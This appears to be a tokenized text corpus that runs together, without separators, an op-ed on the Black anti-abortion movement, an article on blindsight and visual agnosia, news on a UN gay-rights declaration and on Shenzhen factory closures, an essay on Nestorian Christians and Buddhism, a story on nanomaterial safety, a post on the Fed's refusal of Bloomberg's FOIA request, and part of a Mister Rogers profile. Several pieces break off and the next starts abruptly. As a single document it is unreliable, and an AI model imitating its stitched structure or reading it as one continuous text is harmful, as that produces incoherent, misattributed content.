I provide accurate historical and contemporary information
about Black women ’s views on abortion .
African American women who care about reproductive justice know that
the limited membership in the Black anti-abortion movement does n’t
represent our views and we are not fooled into thinking that they care
about gender justice for women .
In fact , if they had their way , we
would be re-enslaved once again , based on our fertility .
But the Black anti-abortion movement needs to be taken seriously .
The
people involved in it carefully exploit religious values to make
inroads into our communities .
They poison the soil in which we must
toil .
Carefully orchestrated campaigns by Black surrogates for the religious
and political right not only oppose abortion , but they also organize on
behalf of many other right wing causes , such as opposing stem cell
research , supporting charter schools and opposing affirmative action .

Through clever positioning and photo - ops by the right wing , the Black
anti-abortion movement appears stronger and more numerous than it
actually is .
Generously funded by a predominantly white anti-abortion
movement desperate for Black representatives , the Black anti-abortion
movement seeks to drive a wedge into the African American community .
They tell African American women that we are now responsible for the
genocide of our own people .
Talk about a “ blame the victim ” strategy !
We are now accused of “ lynching ” our children in our wombs and
practicing white supremacy on ourselves .
Black women are again blamed
for the social conditions in our communities and demonized by those who
claim they only want to save our souls ( and the souls of our unborn
children ) .
This is what lies on steroids look like .
Opposition Research Needed
Who are these people in the Black anti-abortion movement ?
This movement
needs to be carefully studied through opposition research .
Information
on them , their connections to white anti-abortion groups and their
sources of funding is scant .
Of course , the most famous of the Black anti-abortionists is Alveda
King , niece of Dr. Martin Luther King , Jr. She is a Pastoral Associate ,
a member of the avid anti-abortion group Priests for Life , and Director
of African American Outreach for the Gospel of Life Ministries .
Because
her father was Dr. King ’s brother , Alveda is the leading voice for
linking the anti-abortionists to the Civil Rights movement .
This is
despite the fact that both Martin Luther King and Coretta Scott King
were strong supporters of family planning in general , and Planned
Parenthood in particular .
Alveda King , who lives in Atlanta , has also
spoken out strongly against gay rights and in support of charter
schools .
A widely known Black anti-abortion minister is Rev. Clenard H .
Childress of New Jersey , founder of the BlackGenocide.org project and
website .
He is the president of the Northeast Chapter of Life Education
and Resource Network ( L.E.A.R.N. ) , established in 1993 .
He claims that
the “ high rate of abortion has decimated the Black family and destroyed
Black neighborhoods to the detriment of society at large . ”
He led
protests at the 2008 NAACP convention in Cincinnati and has accused the
organization of practicing racism against Black children .
He is also on
the board of the Center for Bio-Ethical Reform that circulates the
Genocide Awareness Project .
Alan Keyes , perennial presidential candidate , is also well known in
anti-abortion circles .
Keyes first came to national attention when
President Reagan appointed him as adviser to Maureen Reagan ( daughter
of the president ) , as she led the official U.S. delegation to the UN
World Conference for Women in Kenya in 1985 .
At this meeting , the U.S .
affirmed its support for the infamous 1984 “ Mexico City ” policy that
banned U.S. funds from supporting abortion worldwide .
Keyes helped lead
the anti-abortion protests at the 2008 Democratic National Convention
in Denver , and is a favorite of the right for his fierce extreme views
on a number of issues .
There are a handful of other Black spokespeople for the anti-abortion
movement .
The point is not how many there are , but the disproportionate
impact they have .
They have created the false impression that if only
Black people were warned that abortion is genocide , women would stop
having them in order to preserve the Black race , either voluntarily or
pressured by the men in their lives .
The Sexism They Sell
The sexism in their viewpoints is mind - boggling .
To them , Black women
are the poor dupes of the abortion rights movement , lacking agency and
decision - making of our own .
In fact , this is a reassertion of Black
male supremacy over the self - determination of women .
It does n’t matter
whether it is from the lips of a man or a woman .
It is about
re-enslaving Black women by making us breeders for someone else ’s cause .
I am reminded of the comments of Shirley Chisholm , the first Black
woman in Congress , who dismissed the genocide argument when asked to
discuss her views on abortion and birth control :
To label family planning and legal abortion programs “ genocide ” is male
rhetoric , for male ears .
It falls flat to female listeners and to
thoughtful male ones .
Women know , and so do many men , that two or three
children who are wanted , prepared for , reared amid love and stability ,
and educated to the limit of their ability will mean more for the
future of the Black and brown races from which they come than any
number of neglected , hungry , ill - housed and ill - clothed youngsters .
We need our leading African American women ’s and Civil Rights
organizations to speak out more strongly in support of reproductive
justice .
We need to organize young people to resist the misinformation
directed at them by these groups .
Many of our campuses are unaware of
the activities of the Black anti-abortionists until they show up ,
usually invited by a white anti-abortion group .
But mostly , we need to let the world know that they do not speak for
Black women .
As my mother would say , “ they might be our color , but they
are not our kind . ”
UNTIL ABOUT 35 years ago scientists believed there was only a single visual - processing area , called the visual cortex , situated at the back of the brain .
We now know more than 30 areas in the brains of primates — including humans — are involved in handling aspects of vision such as the perception of motion , color and depth .
Vision , it turns out , is a much more complex and sophisticated affair than anyone had imagined .
It makes sense that responsibility for processing is divided into various areas that have different computational objectives .
We take our sight for granted because it usually seems so effortless .
It is only when parts of these different visual areas are damaged , causing selective yet often profound disturbances in perception , that we begin to appreciate the range and subtlety of normal human vision .
This approach parallels our study of “ normal ” illusions — by understanding misperceptions , whether for intact or damaged systems , we gain insight into brain processes involved in perception .
Consider the case of a man known as GY .
Damage to his visual cortex resulted in complete blindness in one half of the visual field .
He could not consciously see anything , not even a spot of light , shown to him in that region .
Yet when asked to reach out and touch the spot , he could do so accurately ; he could touch a spot he could n’t see !
It seems downright spooky , but , as you will soon learn , we can explain — at least partially — his condition , known as blindsight , in terms of the multiple specialized anatomical pathways devoted to vision that we mentioned earlier .
[ For more on blindsight , see “ Subconscious Sight , ” by Susana Martinez - Conde ; Scientific American Mind , April / May 2008 . ]
Or consider the strange case of John , elegantly studied in 1987 by M. Jane Riddoch and Glyn W. Humphreys , both now at the University of Birmingham in England .
John had served as an air force pilot .
Soon after his retirement he suffered a stroke that partially damaged visual regions of both hemispheres of his brain .
He could observe things around him ; he was not blind in the usual sense .
But when he saw his wife — or anyone else for that matter — he could not recognize her .
He knew her by her voice ; his brain areas for hearing were unaffected , as were his memories .
Indeed , he could not visually distinguish among umbrellas , chairs or other common objects , even though he claimed to be able to see them perfectly clearly .
“ They are out of focus in my mind , doctor , ” he would say , “ not in my eye . ”
The doctors confirmed this assertion by asking him to copy a drawing of , for example , St. Paul ’s Cathedral that was hanging on the wall .
John could produce a faithful rendering , almost a carbon copy , of the picture but had no idea what it was .
He might as well have been copying a meaningless jumble of lines .
John had a condition known as visual agnosia , a phrase coined by Sigmund Freud meaning “ lack of visual knowledge . ”
Unlike some of Freud ’s more outlandish ideas such as “ penis envy ” or the “ Oedipus complex , ” this one has survived the test of time .
What must it feel like to have such a condition , seeing yet not knowing ?
You can get an inkling by looking at the famous old woman / young lady illustration ( a ) .
The first time you look at this illusion , you probably see the girl .
But after a while , you can mentally flip the image to see an old face .
The young woman ’s chin becomes the hag ’s nose , and the young ear becomes the old eye .
Now , when you were perceiving the face as a young woman , you were also simultaneously seeing the lines and curves constituting the old hag .
Yet you were not perceiving ( or “ knowing ” ) the old woman .
In effect , you suffer from a temporary form of agnosia for her .
Intriguingly , some people , including our colleague Stuart M. Anstis , a psychologist at the University of California , San Diego , are permanently “ stuck ” on the young lady and cannot see the hag .
Psychologist Richard L. Gregory of the University of Bristol in England refers to this inability as visual hagnosia .
Another compelling example is the rat / man illustration ( b ) ( image here ? ) .
When you perceive the rat , you are , effectively , agnosic for the man , and vice versa .
For normal people , it is a bistable figure ; but for John , perception of neither rat nor man would ever occur , despite his normal visual acuity .
You can also get a feel for agnosia by thinking of what happens when you listen to a foreign tongue .
You hear all the sounds , syllables , intonations and rhythms of the speech , but none of it makes any sense to you ( c ) ( image ? ) .
You simply cannot create a meaningful perception from these sensations .
Problems in the Pathways
To understand GY ’s and John ’s predicaments , we will need to take a brief tour through the anatomy of the visual pathways .
Those more than 30 visual - processing areas have staggeringly complex connections among them .
Fortunately , despite this complexity , we can discern a simple overall pattern .
Messages from the retina of the eye get transmitted along the optic nerve before diverging into two parallel anatomical pathways , which we shall call “ old ” and “ new ” pathways to indicate their evolutionary sequence ( d ) .
The old pathway , also called the where pathway , goes to a structure called the superior colliculus , which forms a bump on the roof of the brain stem , the stalk that emerges from below the brain and continues as the spinal cord .
The colliculus helps to determine the location of an object .
When a novel or salient event occurs in your environment ( for example , when there is an object looming over your left shoulder ) , you reflexively orient and swivel your eyeballs toward it without knowing what it is .
That is , you orient to it or locate it before you proceed to identify it .
The other pathway , the newer one , as we shall see , is required for identifying an item , even though it is incapable of locating it or orienting to it .
The new pathway projects to the visual cortex ( V1 for short ) in the back of the brain , where the features of the object are analyzed ( for color , orientation of edges , movement , and so on ) .
Information from V1 splits again into two pathways farther along the visual - processing course : the how pathway projecting into the parietal lobes ( “ How ” do I use or interact with this object ? ) and the what pathway ( “ What ” exactly is this object ?
What does it mean for me ? ) into the temporal lobes ( d ) .
The 30 visual areas we spoke of are shared between these pathways .
Bear in mind that we have described a grossly oversimplified caricature : many fibers go back and forth between the areas ; they are heavily interconnected and not entirely autonomous .
But in science it is not a bad idea to start with a simple picture .
Now let us return to GY , who has blindsight .
GY has complete damage to V1 .
No information reaches either the what or how pathway , rendering him blind in the sense that he cannot consciously see objects .
But because his where pathway ( going through the superior colliculus and bypassing the damaged V1 en route to higher cortical centers ) is intact , he can guide his hand unerringly toward the light spot that he cannot consciously see .
It is as if there is an unconscious zombie trapped in him that can point accurately even though the conscious person is oblivious .
The paradox of blindsight is resolved .
A curious philosophical implication of all this is that only the new pathway is “ conscious ” ; the old pathway can go about its business without consciousness creeping into it .
Both pathways are composed of neural circuits , but only one of them ( as far as we can tell ) is conscious .
Scientists have no idea why , although being linked to tasks such as language and meaning might be important .
Activity in the what pathway eventually evokes a verbal label or name ( “ mother ” ) and nuances of emotions however pronounced ( “ terror ” ) or subtle ( “ warmth ” ) .
Now imagine your V1 is normal , but an evil genius removes your temporal lobes ( the what pathway ) under anesthesia .
What would the world look like when you woke up ?
Without the what pathway , you would n’t be able to recognize , name or appreciate the meanings of things around you .
Yet because the how pathway is intact , you would still “ see ” in the sense of being able to reach out for objects , to dodge missiles hurled at you or to avoid obstacles .
It is hard to imagine this scenario , but it would be roughly equivalent to being transported to the Red Planet ( without your knowledge ) and waking up in a gallery of Martian abstract art .
You could not recognize anything or understand it but could still find your way around , copy the shapes of things and step over fallen objects .
Everything around you — chairs , tables , people , cars — would look like meaningless abstract art .
You would have profound visual agnosia .
This kind of complete damage is rare , but even with partial damage a condition called Klver - Bucy may develop .
In this variant of agnosia the patient has some difficulty identifying common objects but more profound agnosia for food and appropriate “ sex objects . ”
Patients cannot discriminate food from inedible objects , so they may put pebbles in their mouth .
Such people may make sexual overtures to the patient in the adjacent bed , to the doctor or even to animals , though they are mentally normal in other respects .
Seeing without Naming
John ’s predicament is somewhat similar .
In some ways , it is more severe because he has great difficulty identifying any object .
Yet he does n’t take this to the absurd lengths of trying to eat inedible objects or engaging in indiscriminate sexual behavior .
In Klver - Bucy patients there is probably relatively greater damage to regions in the temporal lobes concerned with sex , food and other primal urges , whereas in John the damage mainly affects regions involved in recognizing more neutral and commonplace objects such as chairs , goats and carrots .
Recall , especially , that he could copy pictures accurately , although he was unable to identify or name them .
This is because his how pathway is undamaged , and it can guide the hand around to draw a faithful rendering .
Without the what ( temporal lobe ) pathway , he does not know what it is .
Amazingly , he could even use shears to trim the hedge in his garden ( which only requires how ) but could not weed the garden because he had lost the ability to discriminate weeds from flowers .
But his problems were not quite as extreme as seen in Klver - Bucy ; he could often recognize the general category that an object belonged to ( “ it ’s an animal ” ) albeit not the specific exemplar ( he might say “ dog ” instead of the correct “ goat ” ) .
Or he would identify a carrot as a paintbrush ( “ because it ’s long and has a tuft at its end ” ) .
And thus we can begin to explain the unusual perceptions of GY and John , by examining their particular deficits in terms of our detailed knowledge of the visual areas and their connections and evolutionary origins .
In doing so , we have not only explained these bizarre symptoms but also gained new insights into how normal vision works .
Contrary to naive intuition , vision is not a single process .
Instead it involves multiple specialized areas working in parallel .
How the outputs of these areas are combined to create a seamless unity of conscious perception , however , is as yet an unsolved mystery .

The US was the only major Western nation not to sign the declaration
Sixty - six countries at the United Nations have called for homosexuality to be decriminalised .
The countries signed a declaration sponsored by France and the Netherlands demanding an end to legal punishment based on sexual orientation .
Sixty other countries of the UN's 192 member states , including a number of Arab and African states , rejected the non-binding declaration .
They said laws on homosexuality should be left to individual countries .
Gay men , lesbians and transsexuals worldwide face daily violations of their human rights .
Homosexuality is a criminal offence in more than 80 countries , while in at least seven nations , including Saudi Arabia , sex between men can be punished with the death penalty .
Considerable opposition
This month marks the 60th anniversary of the adoption of the Universal Declaration of Human Rights and the French and Dutch governments are using this to highlight discrimination against homosexuals .
Their statement calls for an end to the execution , arrest and detention of homosexuals and transexuals .
The Dutch Foreign Minister Maxime Verhagen said it was a significant declaration .
Yet there is considerable opposition to this at the UN .
Socially conservative countries in the Arab world and in Africa did not want anything to do with it .
Syria spoke on behalf of 60 countries , arguing that domestic laws should be respected , and claiming the declaration could legitimise deplorable acts including paedophilia .
The US was the only major Western nation not to sign the declaration .
Even though the US Supreme Court has ruled that states cannot make homosexuality a crime , diplomats claimed the declaration was not compatible with the division between between state and federal law .
France and the Netherlands hope more countries will sign up to the declaration in the future .
A factory district just outside Shenzhen , Fuqiao Industrial Park , is a snapshot of the economic troubles rippling through the region .
Several small factories in the park have closed in recent months .
At Wang Jinda Industries , the lettering had been scraped off the entrance after the owner closed last week .
Two customers had arrived for a shipment of goods only to find an empty factory .
Meanwhile , some factories that remained open were struggling .
Workers at a large printing factory said the owners had stopped recruiting new workers in September while many others had quit .
Several workers said wages had dropped significantly as the owners were reducing the length of shifts .
A few workers accused owners of deliberately trying to drive down wages to force workers to quit .
“ Everybody is worried , ” said Lin Baozeng , 26 , a cashier at a canteen inside the industrial park .
Her daily lunch crowd has dwindled to about 100 migrant workers from 500 .
“ If the economy is bad , ” Ms. Lin added as her 3 - year - old daughter played nearby , “ how can I afford to raise my child ? ”
As yet , gauging the scale of factory closings remains difficult in Shenzhen and surrounding Guangdong Province , the country ’s main export engine .
Guangdong was already making a concerted effort to move up the manufacturing value chain at a time when rising labor costs and greater government regulations were making some smaller , cheaper exporters unprofitable .
But the recent export slowdown is having an unanticipated impact .
More than 7,000 small - and medium - sized factories have closed in recent months .
Shenzhen ’s mayor said 50,000 people in the city alone had lost their jobs in the last few months .

And there are mounting signs that the problems could be far broader .
Over all , China ’s economy will continue to expand next year , but some economists say the rate of growth could fall as low as 5 or 6 percent , far slower than the double - digit pace of the preceding several years .
State media have reported that 4.85 million migrant workers have returned to the countryside early before next month ’s annual Lunar New Year holiday .
Some inland provinces have already announced subsidies for unemployed returnees .
On Thursday , the country ’s official news agency , Xinhua , reported that 6.5 million migrant workers may be jobless next year .

WAS THE BUDDHA a demon ?
While few mainline Christians would put the matter in such confrontational terms , any religion claiming exclusive access to truth has real difficulties reconciling other great faiths into its cosmic scheme .
Most Christian churches hold that Jesus alone is the Way , the Truth , and the Life , and many also feel an obligation to carry that message to the world 's unbelievers .
But this creates a fundamental conflict with the followers of famous spiritual figures like Mohammed or Buddha , who preached radically different messages .
Drawing on a strict interpretation of the Bible , some Christians see these rival faiths as not merely false , but as deliberate traps set by the forces of evil .
Being intolerant of other religions - consigning them to hell , in fact - may be bad enough in its own right , but it increasingly has real - world consequences .
As trade and technology shrink the globe , so different religions come into ever - closer contact with one another , and the results can be bloody : witness the apocalyptic assaults in Mumbai .
In such a world , teaching different faiths to acknowledge one another 's claims , to live peaceably together side by side , stops being a matter of good manners and becomes a prerequisite for human survival .
Over the past 30 years , the Roman Catholic Church has faced repeated battles over this question of Christ 's uniqueness , and has cracked down on thinkers who have made daring efforts to accommodate other world religions .
While the Christian dialogue with Islam has attracted most of the headlines , it is the encounters with Hinduism and especially Buddhism that have stirred the most controversy within the church .
Sri Lankan theologians Aloysius Pieris and Tissa Balasuriya have had many run-ins with Vatican critics , and , more recently , the battle has come to American shores .
Last year , the Vatican ordered an investigation of Georgetown University 's Peter Phan , a Jesuit theologian whose main sin , in official eyes , has been to treat the Buddhism of his Vietnamese homeland as a parallel path to salvation .
Following the ideas of Pope Benedict XVI , though , the church refuses to give up its fundamental belief in the unique role of Christ .
In a widely publicized open letter to Italian politician Marcello Pera , Pope Benedict declared that " an inter- religious dialogue in the strict sense of the term is not possible . "
By all means , he said , we should hold conversations with other cultures , but not in a way that acknowledges other religions as equally valid .
While the Vatican does not of course see the Buddha as a demon , it does fear the prospect of syncretism , the dilution of Christian truth in an unholy mixture with other faiths .
Beyond doubt , this view places Benedict in a strong tradition of Christianity as it has developed in Europe since Roman times .
But there is another , ancient tradition , which suggests a very different course .
Europe 's is not the only version of the Christian faith , nor is it necessarily the oldest heir of the ancient church .
For more than 1,000 years , other quite separate branches of the church established thriving communities across Asia , and in their sheer numbers , these churches were comparable to anything Europe could muster at the time .
These Christian bodies traced their ancestry back not through Rome , but directly to the original Jesus movement of ancient Palestine .
They moved across India , Central Asia , and China , showing no hesitation to share - and learn from - the other great religions of the East .
Just how far these Christians were prepared to go is suggested by a startling symbol that appeared on memorials and stone carvings in both southern India and coastal China during the early Middle Ages .
We can easily see that the image depicts a cross , but it takes a moment to realize that the base of the picture - the root from which the cross is growing - is a lotus flower , the symbol of Buddhist enlightenment .
In modern times , most mainstream churches would condemn such an amalgam as a betrayal of the Christian faith , an example of multiculturalism run wild .
Yet concerns about syncretism did not bother these early Asian Christians , who called themselves Nasraye , Nazarenes , like Jesus 's earliest followers .
They were comfortable associating themselves with the other great monastic and mystical religion of the time , and moreover , they believed that both lotus and cross carried similar messages about the quest for light and salvation .
If these Nazarenes could find meaning in the lotus - cross , then why can't modern Catholics , or other inheritors of the faith Jesus inspired ?
Many Christians are coming to terms with just how thoroughly so many of their fundamental assumptions will have to be rethought as their faith today becomes a global religion .
Even modern church leaders who know how rapidly the church is expanding in the global South tend to see European values and traditions as the indispensable norm , in matters of liturgy and theology as much as music and architecture .
Yet the reality is that Christianity has from its earliest days been an intercontinental faith , as firmly established in Asia and Africa as in Europe itself .
When we broaden our scope to look at the faith that by 800 or so stretched from Ireland to Korea , we see the many different ways in which Christians interacted with other believers , in encounters that reshaped both sides .
At their best , these meetings allowed the traditions not just to exchange ideas but to intertwine in productive and enriching ways , in an awe - inspiring chapter of Christian history that the Western churches have all but forgotten .
To understand this story , we need to reconfigure our mental maps .
When we think of the growth of Christianity , we think above all of Europe .
We visualize a movement growing west from Palestine and Syria and spreading into Greece and Italy , and gradually into northern regions .
Europe is still the center of the Catholic Church , of course , but it was also the birthplace of the Protestant denominations that split from it .
For most of us , even speaking of the " Eastern Church " refers to another group of Europeans , namely to the Orthodox believers who stem from the eastern parts of the continent .
English Catholic thinker Hilaire Belloc once proclaimed that " Europe is the Faith ; and the Faith is Europe . "
But in the early centuries other Christians expanded east into Asia and south into Africa , and those other churches survived for the first 1,200 years or so of Christian history .
Far from being fringe sects , these forgotten churches were firmly rooted in the oldest traditions of the apostolic church .
Throughout their history , these Nazarenes used Syriac , which is close to Jesus ' own language of Aramaic , and they followed Yeshua , not Jesus .
No other church - not Roman Catholics , not Eastern Orthodox - has a stronger claim to a direct inheritance from the earliest Jesus movement .
The most stunningly successful of these eastern Christian bodies was the Church of the East , often called the Nestorian church .
While the Western churches were expanding their influence within the framework of the Roman Empire , the Syriac - speaking churches colonized the vast Persian kingdom that ruled from Syria to Pakistan and the borders of China .
From their bases in Mesopotamia - modern Iraq - Nestorian Christians carried out their vast missionary efforts along the Silk Route that crossed Central Asia .
By the eighth century , the Church of the East had an extensive structure across most of central Asia and China , and in southern India .
The church had senior clergy - metropolitans - in Samarkand and Bokhara , in Herat in Afghanistan .
A bishop had his seat in Chang'an , the imperial capital of China , which was then the world 's greatest superpower .
When Nestorian Christians were pressing across Central Asia during the sixth and seventh centuries , they met the missionaries and saints of an equally confident and expansionist religion : Mahayana Buddhism .
Buddhists too wanted to take their saving message to the world , and launched great missions from India 's monasteries and temples .
In this diverse world , Buddhist and Christian monasteries were likely to stand side by side , as neighbors and even , sometimes , as collaborators .
Some historians believe that Nestorian missionaries influenced the religious practices of the Buddhist religion then developing in Tibet .
Monks spoke to monks .
In presenting their faith , Christians naturally used the cultural forms that would be familiar to Asians .
They told their stories in the forms of sutras , verse patterns already made famous by Buddhist missionaries and teachers .
A stunning collection of Jesus Sutras was found in caves at Dunhuang , in northwest China .
Some Nestorian writings draw heavily on Buddhist ideas , as they translate prayers and Christian services in ways that would make sense to Asian readers .
In some texts , the Christian phrase " angels and archangels and hosts of heaven " is translated into the language of buddhas and devas .
One story in particular suggests an almost shocking degree of collaboration between the faiths .
In 782 , the Indian Buddhist missionary Prajna arrived in Chang'an , bearing rich treasures of sutras and other scriptures .
Unfortunately , these were written in Indian languages .
He consulted the local Nestorian bishop , Adam , who had already translated parts of the Bible into Chinese .
Together , Buddhist and Christian scholars worked amiably together for some years to translate seven copious volumes of Buddhist wisdom .
Probably , Adam did this as much from intellectual curiosity as from ecumenical good will , and we can only guess about the conversations that would have ensued :
Do you really care more about relieving suffering than atoning for sin ?
And your monks meditate like ours do ?
The government must begin a " major and urgent " effort to assess the safety of nanomaterials , the tiny particles commonly used in products as varied as sun creams , sports clothing and medicine , leading experts warn today .
Hundreds of consumer products made with nanoparticles , which can be 100 times smaller than a virus , are already on the market , despite an almost complete lack of knowledge of the dangers they may pose to human health and the environment , according to a report by the royal commission on environmental pollution .
Nanoparticles have been embraced as a wonder ingredient across manufacturing industry .
Cosmetic companies add titanium dioxide nanoparticles to sun creams to make them transparent instead of white .
Sports clothing firms have introduced odour - free garments containing nanosilver particles that are twice as toxic to bacteria as bleach .
The motor industry has added carbon nanofibres to car tyres and body panels to strengthen them .
Many nanomaterials are so poorly understood that scientists are unable to predict how they will behave , and are unclear even how to check their safety , the report says .
Sir John Lawton , who chairs the commission , said the lack of tests and environmental monitoring for nanoparticles meant it was impossible to know if the materials were already a cause for concern .
" Would we know if nanomaterials were causing harm ?
The answer is , no we would n't .
We have no evidence that they cause harm , but a lot of that is because of a lack of evidence , " he said .
Industry figures estimate at least 600 products are already available globally that contain nanomaterials of some form , but that figure is expected to rise steeply .
The report warns that the proliferation of nanoparticles will see more of them released into the environment where they could be inhaled , discharged into water courses , and potentially introduced into the food chain with unknown consequences .
Lawton acknowledged nanoparticles were " exceedingly useful " , but said there was " a major gap between the pace at which new nanomaterials are being developed and the generation of environmental health and safety data " .
Some scientists who gave evidence to the commission said it could be 20 years before sufficient safety measures were in place to monitor nanotechnology .
" We do n't want to be alarmist , but experience says the more we find out about this the better , " said Lawton .
" We 're saying [ to the government ] get your finger out and get on and do something .
This is really urgent . "
Last week , the Royal Society expressed its dismay at the government 's lack of action following its own report on nanotechnology in 2004 , which also called for more stringent safety checks .
Nanoparticles lend their success to the extraordinary , and sometimes highly unusual , properties they have .
For example , carbon nanotubes are incredibly strong , while pieces of graphite easily sheer apart .
Nanoparticles of silver are significantly more toxic than lumps of the metal because the tiny particles have a huge surface area .
The medical industry is investing heavily in nanoparticles to create precision drugs that can target specific tissues , such as cancer cells .
The report calls on government departments to back immediate research into toxicity tests for nanoparticles and the impact of nanomaterials in the environment .
The commission picks out three types of nanoparticle it says are of particular concern .
Highly toxic nanosilver will inevitably get into the water supply when sports garments incorporating silver nanoparticles are washed .
These could cause problems at sewage treatment works , which rely on beds of bacteria to purify water .
Carbon nanofibres , which can be added to car tyres or woven into clothing to produce different colours without using dyes , are likely to be shed into the environment where they could be inhaled .
Finally , " buckyballs " - microscopic football - shaped cages of carbon - can be absorbed by simple organisms , according to the report , raising concerns that they could contaminate the food chain .
A spokesperson for Defra said : " As the commission states , it has found no evidence of harm to health or the environment from nanomaterials , but the government remains committed to researching their health and environmental impact . "
Backstory
Eric Drexler , an American engineer sketched the scenario whereby nanomachines no bigger than molecules run amok , consuming the planet 's resources and leaving nothing but grey goo , in his 1986 book Engines of Creation .
He has now dismissed that view , but more realistic concerns remain .
Nanotechnology encompasses any material suited to measurement in billionths of a metre , or nanometres : connections in a chip , fibres in a tennis racket , or particles absorbing UV light in suntan lotion .
Nanoparticles behave unlike lumps of the same material - stronger , more toxic , and with radically different electrical properties .
What makes them so useful also makes their safety so uncertain .
Back in November , Bloomberg News was forced to sue the Federal Reserve to gain greater disclosure on how emergency loans were being made to financial institutions and on what collateral was being used .
I have followed this story closely and will continue to update you on its progress .
Below is the latest news from Bloomberg .
The Federal Reserve refused a request by Bloomberg News to disclose the recipients of more than $ 2 trillion of emergency loans from U.S. taxpayers and the assets the central bank is accepting as collateral .
Bloomberg filed suit Nov. 7 under the U.S. Freedom of Information
Act requesting details about the terms of 11 Fed lending programs , most created during the deepest financial crisis since the Great Depression .
The Fed responded Dec. 8 , saying it ’s allowed to withhold internal memos as well as information about trade secrets and commercial information .
The institution confirmed that a records search found 231 pages of documents pertaining to some of the requests .
“ If they told us what they held , we would know the potential losses that the government may take and that ’s what they do n’t want us to know , ” said Carlos Mendez , a senior managing director at New York - based ICP Capital LLC , which oversees $ 22 billion in assets .
This is a case where accountability is definitely warranted .
We are talking trillions of dollars that are being loaned with zero oversight .
We need more answers in a well - functioning democracy .
The core of the argument for more transparency and the fig leaf used by the Fed to prevent it are below .
“ Notwithstanding calls for enhanced transparency , the Board must protect against the substantial , multiple harms that might result from disclosure , ” Jennifer J. Johnson , the secretary for the Fed ’s Board of Governors , said in a letter e-mailed to Bloomberg News .
‘ Dangerous Step ’
“ In its considered judgment and in view of current circumstances , it would be a dangerous step to release this otherwise confidential information , ” she wrote .
New York - based Citigroup Inc. , which is shrinking its global workforce of 352,000 through asset sales and job cuts , is among the nine biggest banks receiving $ 125 billion in capital from the TARP since it was signed into law Oct .
3 . More than 170 regional lenders are seeking an additional $ 74 billion .
Fed Chairman Ben S. Bernanke and Treasury Secretary Henry Paulson said in September they would meet congressional demands for transparency in a $ 700 billion bailout of the banking system .
The Freedom of Information Act obliges federal agencies to make government documents available to the press and public .
The Bloomberg lawsuit , filed in New York , does n’t seek money damages .
‘ Right to Know ’
“ There has to be something they can tell the public because we have a right to know what they are doing , ” said Lucy Dalglish , executive director of the Arlington , Virginia - based Reporters Committee for Freedom of the Press .
“ It would really be a shame if we have to find this out 10 years from now after some really nasty class - action suit and our financial system has completely collapsed , ” she said .
The Fed ’s five - page response to Bloomberg may be “ unprecedented ” because the board usually does n’t go into such detail about its position , said Lee Levine , a partner at Levine Sullivan Koch & Schulz LLP in Washington .
“ This is uncharted territory , ” said Levine during an interview from his New York office .
“ The Freedom of Information Act was n’t built to anticipate this situation and that ’s evident from the way the Fed tried to shoehorn their argument into the trade - secrets exemption . ”
The Fed lent cash and government bonds to banks that handed over collateral including stocks and subprime and structured securities such as collateralized debt obligations , according to the Fed Web site .
Borrowers include the now - bankrupt Lehman Brothers Holdings Inc. , Citigroup and New York - based JPMorgan Chase & Co. , the country ’s biggest bank by assets .
Banks oppose any release of information because that might signal weakness and spur short - selling or a run by depositors , Scott Talbott , senior vice president of government affairs for the Financial Services Roundtable , a Washington trade group , said in an interview last month .
‘ Complete Truth ’
“ Americans do n’t want to get blindsided anymore , ” Mendez said in an interview .
“ They do n’t want it sugarcoated or whitewashed .
They want the complete truth .
The truth is we ca n’t take all the pain right now . ”
The Bloomberg lawsuit said the collateral lists “ are central to understanding and assessing the government ’s response to the most cataclysmic financial crisis in America since the Great Depression . ”
As more on developments become available , I will post .
Ultimately , I believe this story will become a much larger political issue .
It represents a basic struggle to end the opaque nature of finance as practiced over the last years leading up to this enormous crisis .
Fed Refuses to Disclose Recipients of $ 2 Trillion – Bloomberg
Nearly every morning of his life , Mister Rogers has gone swimming , and now , here he is , standing in a locker room , seventy years old and as white as the Easter Bunny , rimed with frost wherever he has hair , gnawed pink in the spots where his dry skin has gone to flaking , slightly wattled at the neck , slightly stooped at the shoulder , slightly sunken in the chest , slightly curvy at the hips , slightly pigeoned at the toes , slightly aswing at the fine bobbing nest of himself ... and yet when he speaks , it is in that voice , his voice , the famous one , the unmistakable one , the televised one , the voice dressed in sweater and sneakers , the soft one , the reassuring one , the curious and expository one , the sly voice that sounds adult to the ears of children and childish to the ears of adults , and what he says , in the midst of all his bobbing - nudity , is as understated as it is obvious : " Well , Tom , I guess you 've already gotten a deeper glimpse into my daily routine than most people have . "
ONCE UPON A TIME , a long time ago , a man took off his jacket and put on a sweater .
Then he took off his shoes and put on a pair of sneakers .
His name was Fred Rogers .
He was starting a television program , aimed at children , called Mister Rogers ' Neighborhood .
He had been on television before , but only as the voices and movements of puppets , on a program called The Children 's Corner .
Now he was stepping in front of the camera as Mister Rogers , and he wanted to do things right , and whatever he did right , he wanted to repeat .
And so , once upon a time , Fred Rogers took off his jacket and put on a sweater his mother had made him , a cardigan with a zipper .
Then he took off his shoes and put on a pair of navy - blue canvas boating sneakers .
He did the same thing the next day , and then the next ... until he had done the same things , those things , 865 times , at the beginning of 865 television programs , over a span of thirty - one years .
The first time I met Mister Rogers , he told me a story of how deeply his simple gestures had been felt , and received .
He had just come back from visiting Koko , the gorilla who has learned -- or who has been taught -- American Sign Language .
Koko watches television .
Koko watches Mister Rogers ' Neighborhood , and when Mister Rogers , in his sweater and sneakers , entered the place where she lives , Koko immediately folded him in her long , black arms , as though he were a child , and then ...
" She took my shoes off , Tom , " Mister Rogers said .
Koko was much bigger than Mister Rogers .
She weighed 280 pounds , and Mister Rogers weighed 143 .
Koko weighed 280 pounds because she is a gorilla , and Mister Rogers weighed 143 pounds because he has weighed 143 pounds as long as he has been Mister Rogers , because once upon a time , around thirty - one years ago , Mister Rogers stepped on a scale , and the scale told him that Mister Rogers weighs 143 pounds .
No , not that he weighed 143 pounds , but that he weighs 143 pounds ....
And so , every day , Mister Rogers refuses to do anything that would make his weight change -- he neither drinks , nor smokes , nor eats flesh of any kind , nor goes to bed late at night , nor sleeps late in the morning , nor even watches television -- and every morning , when he swims , he steps on a scale in his bathing suit and his bathing cap and his goggles , and the scale tells him he weighs 143 pounds .
This has happened so many times that Mister Rogers has come to see that number as a gift , as a destiny fulfilled , because , as he says , " the number 143 means ` I love you . '
It takes one letter to say ' I ' and four letters to say `love ' and three letters to say `you . '
One hundred and forty - three .
` I love you . '
Is n't that wonderful ? "
THE FIRST TIME I CALLED MISTER ROGERS on the telephone , I woke him up from his nap .
